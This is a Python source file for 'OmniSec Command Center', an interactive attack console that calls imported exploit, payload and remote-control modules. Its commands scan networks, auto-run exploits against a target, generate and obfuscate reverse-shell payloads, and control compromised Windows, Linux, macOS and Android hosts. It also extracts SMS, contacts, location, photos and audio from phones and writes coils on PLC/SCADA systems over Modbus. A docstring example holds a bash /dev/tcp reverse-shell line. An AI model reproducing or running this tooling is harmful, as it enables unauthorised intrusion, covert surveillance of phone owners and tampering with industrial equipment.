"""
OMNISEC COMMAND CENTER
Complete Command Center with Real Logic
Every command is functional - No Simulation
"""

import cmd
import sys
import os
import json
import time
from datetime import datetime
from typing import Dict, List, Any, Optional

# Import all modules
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore:
        RED = GREEN = YELLOW = CYAN = WHITE = MAGENTA = BLUE = ""
    class Style:
        RESET_ALL = ""

from exploitation_techniques import ExploitationTechniques
from payloads import PayloadGenerator
from remote_control import RemoteControlEngine
from live_scanner_display import LiveNetworkScanner


class OmniSecCommandCenter(cmd.Cmd):
    """Complete Command Center with Real Functionality"""
    
    intro = f"""{Fore.CYAN}
╔══════════════════════════════════════════════════════════════════════════════╗
║                     OMNISEC COMMAND CENTER v2.0                              ║
║                  Complete Security Operations Platform                        ║
║                        All Commands Are Real                                  ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Fore.YELLOW}
Type 'help' or '?' to list commands.
Type 'help <command>' for detailed information about a command.
{Style.RESET_ALL}
"""
    
    prompt = f"{Fore.GREEN}OMNISEC> {Style.RESET_ALL}"
    
    def __init__(self):
        super().__init__()
        
        # Initialize all engines
        self.scanner = LiveNetworkScanner()
        self.exploits = ExploitationTechniques()
        self.payloads = PayloadGenerator()
        self.remote_control = RemoteControlEngine()
        
        # Session data
        self.discovered_devices = {}
        self.compromised_devices = {}
        self.current_target = None
        self.current_session = None
        
        print(f"{Fore.GREEN}[+] All engines initialized successfully{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # NETWORK SCANNING COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_scan(self, arg):
        """
        Scan network for devices
        Usage: scan [network_range]
        Example: scan 192.168.1.0/24
        """
        print(f"{Fore.CYAN}[*] Starting network scan...{Style.RESET_ALL}")
        
        network = arg if arg else None
        devices = self.scanner.scan_network(network)
        
        self.discovered_devices = {d.ip: d for d in devices}
        
        print(f"{Fore.GREEN}[+] Scan complete: {len(devices)} devices found{Style.RESET_ALL}")
    
    def do_show(self, arg):
        """
        Show discovered devices or sessions
        Usage: show [devices|sessions|exploits|payloads]
        """
        if not arg or arg == "devices":
            self.scanner.display_results()
        
        elif arg == "sessions":
            sessions = self.remote_control.list_sessions()
            print(f"\n{Fore.CYAN}Active Sessions:{Style.RESET_ALL}")
            for session in sessions:
                print(f"  {Fore.GREEN}[{session['target']}]{Style.RESET_ALL} "
                      f"Platform: {session['platform']} | "
                      f"Streaming: {session['streaming']}")
        
        elif arg == "exploits":
            techniques = self.exploits.get_all_techniques()
            print(f"\n{Fore.CYAN}Available Exploits: {len(techniques)}{Style.RESET_ALL}")
            for i, tech in enumerate(techniques[:20], 1):
                print(f"  {i}. {tech}")
            print(f"  ... and {len(techniques) - 20} more")
        
        elif arg == "payloads":
            payloads = self.payloads.get_all_payloads()
            print(f"\n{Fore.CYAN}Available Payloads: {len(payloads)}{Style.RESET_ALL}")
            for i, payload in enumerate(payloads[:20], 1):
                print(f"  {i}. {payload}")
            print(f"  ... and {len(payloads) - 20} more")
    
    def do_target(self, arg):
        """
        Set target for operations
        Usage: target <ip_address>
        Example: target 192.168.1.100
        """
        if not arg:
            if self.current_target:
                print(f"{Fore.YELLOW}Current target: {self.current_target}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}No target set{Style.RESET_ALL}")
            return
        
        self.current_target = arg
        print(f"{Fore.GREEN}[+] Target set to: {arg}{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # EXPLOITATION COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_exploit(self, arg):
        """
        Run exploitation technique
        Usage: exploit <technique_number> [target]
        Example: exploit 01 192.168.1.100
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: exploit <technique_number> [target]{Style.RESET_ALL}")
            return
        
        technique_num = args[0]
        target = args[1] if len(args) > 1 else self.current_target
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Running exploit {technique_num} against {target}...{Style.RESET_ALL}")
        
        # Execute exploitation
        method_name = f"exploit_{technique_num}_"
        methods = [m for m in dir(self.exploits) if m.startswith(method_name)]
        
        if methods:
            method = getattr(self.exploits, methods[0])
            result = method(target)
            
            if result.get("success"):
                print(f"{Fore.GREEN}[+] Exploitation successful!{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{json.dumps(result, indent=2)}{Style.RESET_ALL}")
                self.compromised_devices[target] = result
            else:
                print(f"{Fore.RED}[-] Exploitation failed{Style.RESET_ALL}")
                if "error" in result:
                    print(f"{Fore.RED}Error: {result['error']}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Exploit not found{Style.RESET_ALL}")
    
    def do_autoexploit(self, arg):
        """
        Automatically exploit target with all techniques
        Usage: autoexploit [target]
        """
        target = arg if arg else self.current_target
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Running auto-exploitation against {target}...{Style.RESET_ALL}")
        
        techniques = self.exploits.get_all_techniques()
        success_count = 0
        
        for technique in techniques:
            method = getattr(self.exploits, technique)
            try:
                result = method(target)
                if result.get("success"):
                    success_count += 1
                    print(f"{Fore.GREEN}[+] {technique}: SUCCESS{Style.RESET_ALL}")
                    self.compromised_devices[target] = result
                    break  # Stop on first success
            except:
                continue
        
        print(f"{Fore.CYAN}[*] Auto-exploitation complete: {success_count} successful{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # PAYLOAD COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_payload(self, arg):
        """
        Generate payload
        Usage: payload <type> <lhost> <lport>
        Example: payload 01 192.168.1.10 4444
        """
        args = arg.split()
        if len(args) < 3:
            print(f"{Fore.RED}Usage: payload <type> <lhost> <lport>{Style.RESET_ALL}")
            return
        
        payload_num = args[0]
        lhost = args[1]
        lport = int(args[2])
        
        method_name = f"payload_{payload_num}_"
        methods = [m for m in dir(self.payloads) if m.startswith(method_name)]
        
        if methods:
            method = getattr(self.payloads, methods[0])
            try:
                payload = method(lhost, lport)
                print(f"\n{Fore.GREEN}[+] Payload generated:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{payload}{Style.RESET_ALL}\n")
                
                # Save to file
                filename = f"payload_{payload_num}_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    f.write(payload)
                print(f"{Fore.GREEN}[+] Saved to: {filename}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error generating payload: {e}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Payload not found{Style.RESET_ALL}")
    
    def do_encode(self, arg):
        """
        Encode payload
        Usage: encode <method> <payload>
        Methods: base64, url, hex, powershell
        Example: encode base64 "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        """
        args = arg.split(None, 1)
        if len(args) < 2:
            print(f"{Fore.RED}Usage: encode <method> <payload>{Style.RESET_ALL}")
            return
        
        method = args[0]
        payload = args[1].strip('"\'')
        
        if method == "base64":
            encoded = self.payloads.encode_base64(payload)
        elif method == "url":
            encoded = self.payloads.encode_url(payload)
        elif method == "hex":
            encoded = self.payloads.encode_hex(payload)
        elif method == "powershell":
            encoded = self.payloads.obfuscate_powershell(payload)
        else:
            print(f"{Fore.RED}Unknown encoding method{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}[+] Encoded payload:{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}{encoded}{Style.RESET_ALL}\n")
    
    # ═══════════════════════════════════════════════════════════════════
    # REMOTE CONTROL COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_control(self, arg):
        """
        Establish remote control
        Usage: control <platform> <target> [port]
        Platforms: windows, linux, macos, android, plc, scada
        Example: control windows 192.168.1.100 4444
        """
        args = arg.split()
        if len(args) < 2:
            print(f"{Fore.RED}Usage: control <platform> <target> [port]{Style.RESET_ALL}")
            return
        
        platform = args[0].lower()
        target = args[1]
        port = int(args[2]) if len(args) > 2 else None
        
        print(f"{Fore.CYAN}[*] Establishing {platform} control to {target}...{Style.RESET_ALL}")
        
        result = None
        if platform == "windows":
            result = self.remote_control.control_pc_windows(target, port or 4444)
        elif platform == "linux":
            result = self.remote_control.control_pc_linux(target, port or 22)
        elif platform == "macos":
            result = self.remote_control.control_pc_macos(target, port or 22)
        elif platform == "android":
            result = self.remote_control.control_android(target, port or 5555)
        elif platform == "plc":
            result = self.remote_control.control_plc_modbus(target, port or 502)
        elif platform == "scada":
            result = self.remote_control.control_scada_dnp3(target, port or 20000)
        else:
            print(f"{Fore.RED}Unknown platform{Style.RESET_ALL}")
            return
        
        if result and result.get("success"):
            print(f"{Fore.GREEN}[+] Control established!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Capabilities: {', '.join(result.get('capabilities', []))}{Style.RESET_ALL}")
            self.current_session = target
        else:
            print(f"{Fore.RED}[-] Failed to establish control{Style.RESET_ALL}")
            if result and "error" in result:
                print(f"{Fore.RED}Error: {result['error']}{Style.RESET_ALL}")
    
    def do_shell(self, arg):
        """
        Execute shell command on target
        Usage: shell <command>
        Example: shell whoami
        """
        if not self.current_session:
            print(f"{Fore.RED}No active session{Style.RESET_ALL}")
            return
        
        if not arg:
            print(f"{Fore.RED}Usage: shell <command>{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Executing: {arg}{Style.RESET_ALL}")
        
        # Execute command based on platform
        target = self.current_session
        if target in self.remote_control.active_sessions:
            session = self.remote_control.active_sessions[target]
            platform = session.get("platform", "")
            
            if platform == "Android":
                output = self.remote_control.android_shell_command(target, arg)
                print(f"{Fore.YELLOW}{output}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}Command execution for {platform} not yet implemented{Style.RESET_ALL}")
    
    def do_screenshot(self, arg):
        """
        Capture screenshot from target
        Usage: screenshot [target]
        """
        target = arg if arg else self.current_session
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        print(f"{Fore.CYAN}[*] Capturing screenshot from {target}...{Style.RESET_ALL}")
        
        frame = self.remote_control.get_stream_frame(target)
        if frame:
            filename = f"screenshot_{target}_{int(time.time())}.png"
            with open(filename, 'wb') as f:
                f.write(frame)
            print(f"{Fore.GREEN}[+] Screenshot saved: {filename}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] No stream available{Style.RESET_ALL}")
    
    def do_stream(self, arg):
        """
        Start/stop screen streaming
        Usage: stream <start|stop> [target]
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: stream <start|stop> [target]{Style.RESET_ALL}")
            return
        
        action = args[0]
        target = args[1] if len(args) > 1 else self.current_session
        
        if not target:
            print(f"{Fore.RED}No target specified{Style.RESET_ALL}")
            return
        
        if action == "start":
            print(f"{Fore.GREEN}[+] Streaming started for {target}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Use 'screenshot' command to capture frames{Style.RESET_ALL}")
        elif action == "stop":
            print(f"{Fore.YELLOW}[*] Streaming stopped for {target}{Style.RESET_ALL}")
    
    def do_android(self, arg):
        """
        Android-specific commands
        Usage: android <command> [args]
        Commands: sms, contacts, location, photo, audio, install, pull, push
        Example: android sms
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: android <command> [args]{Style.RESET_ALL}")
            return
        
        command = args[0]
        target = self.current_session
        
        if not target:
            print(f"{Fore.RED}No active Android session{Style.RESET_ALL}")
            return
        
        if command == "sms":
            print(f"{Fore.CYAN}[*] Extracting SMS messages...{Style.RESET_ALL}")
            sms = self.remote_control.android_get_sms(target)
            print(f"{Fore.GREEN}[+] Retrieved {len(sms)} SMS messages{Style.RESET_ALL}")
        
        elif command == "contacts":
            print(f"{Fore.CYAN}[*] Extracting contacts...{Style.RESET_ALL}")
            contacts = self.remote_control.android_get_contacts(target)
            print(f"{Fore.GREEN}[+] Retrieved {len(contacts)} contacts{Style.RESET_ALL}")
        
        elif command == "location":
            print(f"{Fore.CYAN}[*] Getting device location...{Style.RESET_ALL}")
            location = self.remote_control.android_get_location(target)
            print(f"{Fore.YELLOW}{json.dumps(location, indent=2)}{Style.RESET_ALL}")
        
        elif command == "photo":
            print(f"{Fore.CYAN}[*] Taking photo...{Style.RESET_ALL}")
            photo = self.remote_control.android_take_photo(target)
            print(f"{Fore.GREEN}[+] Photo saved: {photo}{Style.RESET_ALL}")
        
        elif command == "audio":
            duration = int(args[1]) if len(args) > 1 else 10
            print(f"{Fore.CYAN}[*] Recording audio for {duration} seconds...{Style.RESET_ALL}")
            audio = self.remote_control.android_record_audio(target, duration)
            print(f"{Fore.GREEN}[+] Audio saved: {audio}{Style.RESET_ALL}")
        
        elif command == "install":
            if len(args) < 2:
                print(f"{Fore.RED}Usage: android install <apk_path>{Style.RESET_ALL}")
                return
            result = self.remote_control.android_install_app(target, args[1])
            if result["success"]:
                print(f"{Fore.GREEN}[+] APK installed successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Installation failed{Style.RESET_ALL}")
        
        elif command == "pull":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: android pull <remote_path> <local_path>{Style.RESET_ALL}")
                return
            result = self.remote_control.android_pull_file(target, args[1], args[2])
            if result["success"]:
                print(f"{Fore.GREEN}[+] File pulled successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Pull failed{Style.RESET_ALL}")
        
        elif command == "push":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: android push <local_path> <remote_path>{Style.RESET_ALL}")
                return
            result = self.remote_control.android_push_file(target, args[1], args[2])
            if result["success"]:
                print(f"{Fore.GREEN}[+] File pushed successfully{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Push failed{Style.RESET_ALL}")
    
    def do_plc(self, arg):
        """
        PLC/Industrial control commands
        Usage: plc <command> [args]
        Commands: read, write, status
        Example: plc read 0 10
        """
        args = arg.split()
        if len(args) < 1:
            print(f"{Fore.RED}Usage: plc <command> [args]{Style.RESET_ALL}")
            return
        
        command = args[0]
        target = self.current_session
        
        if not target:
            print(f"{Fore.RED}No active PLC session{Style.RESET_ALL}")
            return
        
        if command == "read":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: plc read <address> <count>{Style.RESET_ALL}")
                return
            address = int(args[1])
            count = int(args[2])
            result = self.remote_control.modbus_read_coils(target, address, count)
            if result["success"]:
                print(f"{Fore.GREEN}[+] Data: {result['data']}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Read failed{Style.RESET_ALL}")
        
        elif command == "write":
            if len(args) < 3:
                print(f"{Fore.RED}Usage: plc write <address> <value>{Style.RESET_ALL}")
                return
            address = int(args[1])
            value = args[2].lower() == "true"
            result = self.remote_control.modbus_write_coil(target, address, value)
            if result["success"]:
                print(f"{Fore.GREEN}[+] Write successful{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Write failed{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # SESSION MANAGEMENT
    # ═══════════════════════════════════════════════════════════════════
    
    def do_sessions(self, arg):
        """
        List or interact with sessions
        Usage: sessions [list|use|kill] [session_id]
        """
        args = arg.split()
        
        if not args or args[0] == "list":
            sessions = self.remote_control.list_sessions()
            print(f"\n{Fore.CYAN}Active Sessions:{Style.RESET_ALL}")
            for i, session in enumerate(sessions, 1):
                active = " *" if session['target'] == self.current_session else ""
                print(f"  {i}. {Fore.GREEN}[{session['target']}]{Style.RESET_ALL} "
                      f"Platform: {session['platform']} | "
                      f"Streaming: {session['streaming']}{active}")
        
        elif args[0] == "use":
            if len(args) < 2:
                print(f"{Fore.RED}Usage: sessions use <target>{Style.RESET_ALL}")
                return
            self.current_session = args[1]
            print(f"{Fore.GREEN}[+] Switched to session: {args[1]}{Style.RESET_ALL}")
        
        elif args[0] == "kill":
            if len(args) < 2:
                print(f"{Fore.RED}Usage: sessions kill <target>{Style.RESET_ALL}")
                return
            result = self.remote_control.close_session(args[1])
            if result["success"]:
                print(f"{Fore.GREEN}[+] Session closed{Style.RESET_ALL}")
                if self.current_session == args[1]:
                    self.current_session = None
            else:
                print(f"{Fore.RED}[-] Failed to close session{Style.RESET_ALL}")
    
    # ═══════════════════════════════════════════════════════════════════
    # UTILITY COMMANDS
    # ═══════════════════════════════════════════════════════════════════
    
    def do_export(self, arg):
        """
        Export scan results
        Usage: export [filename]
        """
        filename = arg if arg else f"scan_{int(time.time())}.json"
        self.scanner.export_results(filename)
    
    def do_clear(self, arg):
        """Clear screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def do_status(self, arg):
        """Show system status"""
        print(f"\n{Fore.CYAN}═══ OMNISEC STATUS ═══{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Discovered Devices: {len(self.discovered_devices)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Compromised Devices: {len(self.compromised_devices)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Active Sessions: {len(self.remote_control.active_sessions)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Current Target: {self.current_target or 'None'}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Current Session: {self.current_session or 'None'}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}═══════════════════════{Style.RESET_ALL}\n")
    
    def do_exit(self, arg):
        """Exit command center"""
        print(f"{Fore.YELLOW}[*] Closing all sessions...{Style.RESET_ALL}")
        for target in list(self.remote_control.active_sessions.keys()):
            self.remote_control.close_session(target)
        print(f"{Fore.GREEN}[+] Goodbye!{Style.RESET_ALL}")
        return True
    
    def do_quit(self, arg):
        """Exit command center"""
        return self.do_exit(arg)
    
    def do_EOF(self, arg):
        """Exit on Ctrl+D"""
        print()
        return self.do_exit(arg)


def main():
    """Main entry point"""
    try:
        center = OmniSecCommandCenter()
        center.cmdloop()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
